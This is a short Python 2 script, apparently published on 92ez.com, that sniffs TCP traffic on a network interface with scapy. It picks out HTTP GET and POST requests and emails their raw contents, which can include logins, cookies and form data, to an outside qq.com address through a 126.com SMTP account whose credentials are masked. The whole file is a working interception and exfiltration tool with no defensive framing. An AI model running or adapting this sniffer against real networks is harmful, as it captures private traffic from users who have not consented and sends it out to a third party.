#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from email.mime.text import MIMEText
from scapy.all import *
import smtplib
import os
import sys

def dealPackage(packet):

	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")

	if len(lines[-1]) > 1 and len(lines) > 1:
		print '-'*90
		# reciver,title,body
		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
		for line in lines:
			print line

def sendMail(receiver, title, body):
	host = 'smtp.126.com'
	port = 25
	sender = '***@126.com'
	pwd = '***'

	msg = MIMEText(body, 'html')
	msg['subject'] = title
	msg['from'] = sender
	msg['to'] = receiver

	try:
		s = smtplib.SMTP(host, port)
		s.login(sender, pwd)
		s.sendmail(sender, receiver, msg.as_string())
		print '[*] The mail named %s to %s is sent successly.' % (title, receiver)
	except Exception,e:
		sys.exit('[x] Send email failed! Exception is %s.' % e)

def doSniffer():
	sniff_iface = 'eth0'
	try:
		print '[√] Sniffing on '+sniff_iface+'!'
		sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
	except Exception,e:
		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))

if __name__ == '__main__':
    doSniffer()
